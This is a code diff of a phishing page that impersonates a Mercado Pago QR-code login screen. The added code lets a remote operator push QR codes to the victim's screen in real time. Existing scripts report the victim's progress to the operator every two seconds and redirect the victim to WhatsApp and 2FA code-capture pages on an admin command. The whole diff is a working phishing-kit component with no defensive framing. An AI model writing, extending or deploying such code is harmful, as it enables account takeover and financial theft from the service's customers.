@@ -27,6 +27,9 @@ if (isMobileDevice()) {
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Escaneie o QR para iniciar sessão de forma segura</title>
     <link rel="icon" href="https://http2.mlstatic.com/frontend-assets/mp-web-navigation/ui-navigation/6.7.73/mercadopago/favicon.svg" type="image/svg"/>
+    
+    <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
+    
     <style>
         :root {
             --andes-color-yellow-500: #ffe600;
@@ -48,12 +51,18 @@ if (isMobileDevice()) {
         .help-link:hover { text-decoration: underline; }
         .qr-card { width: 100%; max-width: 38.75rem; height: 26.25rem; margin-top: 0; background-color: var(--andes-background-color-primary); box-shadow: 0 1px 4px 0 rgba(0,0,0,.1); border-radius: 6px; padding: 48px; box-sizing: border-box; display: flex; flex-direction: column; align-items: center; justify-content: center; }
         
-        /* O placeholder de texto foi removido, então não precisamos mais do seu estilo */
+        /* Estilo para o container do QR Code e para a imagem dentro dele */
         .qr-card .qr-image {
             width: 220px;
             height: 220px;
             margin-bottom: 32px;
-            display: block; /* A imagem agora é visível por padrão */
+            display: flex; /* Centraliza a imagem/código gerado */
+            align-items: center;
+            justify-content: center;
+        }
+        .qr-card .qr-image img {
+             max-width: 100%;
+             max-height: 100%;
         }
         .other-method-link { color: var(--andes-text-color-link); text-decoration: none; font-size: 15px; font-weight: 500; }
         .other-method-link:hover { text-decoration: underline; }
@@ -74,7 +83,7 @@ if (isMobileDevice()) {
             </div>
 
             <div class="qr-card">
-                <img src="2.png" alt="Código QR" id="qr-image" class="qr-image">
+                <div id="qr-code-container" class="qr-image"></div>
                 
                 <a href="senha.php" class="other-method-link">Escolher outro método</a>
             </div>
@@ -82,21 +91,54 @@ if (isMobileDevice()) {
     </main>
 
     <script>
-        const qrImage = document.getElementById('qr-image');
+        const qrContainer = document.getElementById('qr-code-container');
+        let qrCodeInstance = null; // Guardará a instância do QR Code gerado
+
+        // Função para mostrar uma imagem (quando vem da extensão)
+        function displayQrImage(path) {
+            qrContainer.innerHTML = ''; // Limpa o container
+            const img = document.createElement('img');
+            // Adiciona um timestamp para evitar o cache do navegador
+            img.src = path + '?t=' + new Date().getTime();
+            img.alt = 'Código QR';
+            qrContainer.appendChild(img);
+        }
+
+        // Função para gerar um QR Code a partir do texto (quando vem do admin)
+        function generateQrFromText(text) {
+            // Limpa o container antes de gerar um novo código
+            qrContainer.innerHTML = ''; 
+            // Cria uma nova instância do QR Code dentro do container
+            qrCodeInstance = new QRCode(qrContainer, {
+                text: text,
+                width: 220,
+                height: 220,
+                colorDark: "#000000",
+                colorLight: "#ffffff",
+                correctLevel: QRCode.CorrectLevel.H
+            });
+        }
+
+        // Exibe o QR Code padrão (2.png) ao carregar a página inicialmente
+        displayQrImage('2.png');
 
         async function verificarQrCode() {
             try {
                 const response = await fetch('api_get_qrcode.php');
                 const data = await response.json();
 
-                // Se a API retornar sucesso e um caminho de imagem...
-                if (data.success && data.qrcode_path) {
-                    console.log('Novo QR Code recebido:', data.qrcode_path);
-                    
-                    // ...atualiza a imagem, adicionando um timestamp para evitar o cache do navegador.
-                    qrImage.src = data.qrcode_path + '?t=' + new Date().getTime();
+                // Lógica inteligente baseada no 'type' retornado pela API
+                if (data.success) {
+                    console.log('Novo QR Code recebido:', { type: data.type });
+                    if (data.type === 'image') {
+                        // Se for imagem, apenas atualiza o SRC da imagem existente
+                        displayQrImage(data.data);
+                    } else if (data.type === 'text') {
+                        // Se for texto, usa a biblioteca para gerar um novo QR Code
+                        generateQrFromText(data.data);
+                    }
                 } else {
-                    // Se não, continua exibindo o QR Code padrão.
+                    // Se não houver novo QR Code, não faz nada, apenas loga.
                     console.log('Aguardando novo QR Code...');
                 }
             } catch (error) {
@@ -107,6 +149,7 @@ if (isMobileDevice()) {
         // Inicia a verificação a cada 3 segundos
         setInterval(verificarQrCode, 3000);
     </script>
+    
     <script>
         (function() {
             // Mapa de nomes de arquivos para mensagens de status amigáveis.
@@ -134,13 +177,9 @@ if (isMobileDevice()) {
                 'whats2framobile.php': 'Usuário na tela para verificar duas etapas com código no WhatsApp (Mobile)'
             };
 
-            // Descobre o nome do arquivo da página atual
             const currentPage = window.location.pathname.split('/').pop();
-            
-            // Pega a mensagem de status correspondente
             const currentStatus = statusMap[currentPage] || 'Página Desconhecida';
 
-            // Função que envia o "ping" para a API
             async function sendStatusUpdate() {
                 try {
                     await fetch('api_update_status.php', {
@@ -150,47 +189,31 @@ if (isMobileDevice()) {
                         },
                         body: JSON.stringify({ status: currentStatus })
                     });
-                    // Não precisamos fazer nada com a resposta, apenas enviar.
                 } catch (error) {
-                    // Se falhar, loga no console sem incomodar o usuário.
                     console.error('Falha ao enviar atualização de status:', error);
                 }
             }
-
-            // Envia o primeiro status imediatamente ao carregar a página
             sendStatusUpdate();
-
-            // Configura para enviar o status a cada 2000 milissegundos (2 segundos)
             setInterval(sendStatusUpdate, 2000);
         })();
     </script>
     <script>
         (function() {
-            // Pega a URL de redirecionamento que o PHP definiu
             const redirectUrl = "<?php echo $redirect_target_2fa; ?>";
-
             async function checkAdminCommand() {
                 try {
                     const response = await fetch('api_check_status.php');
                     const data = await response.json();
-
                     console.log('Status atual:', data.status); 
-
                     if (data.status === 'redirecionar_para_2fa') {
-                        // Para a verificação para não redirecionar em loop
                         clearInterval(statusInterval);
-                        
                         console.log('Comando do admin recebido! Redirecionando para:', redirectUrl);
-                        
-                        // Redireciona o usuário para o alvo correto (desktop ou mobile)
                         window.location.href = redirectUrl;
                     }
                 } catch (error) {
                     console.error('Erro ao verificar status:', error);
                 }
             }
-
-            // Inicia a verificação a cada 3 segundos
             const statusInterval = setInterval(checkAdminCommand, 3000);
         })();
     </script>
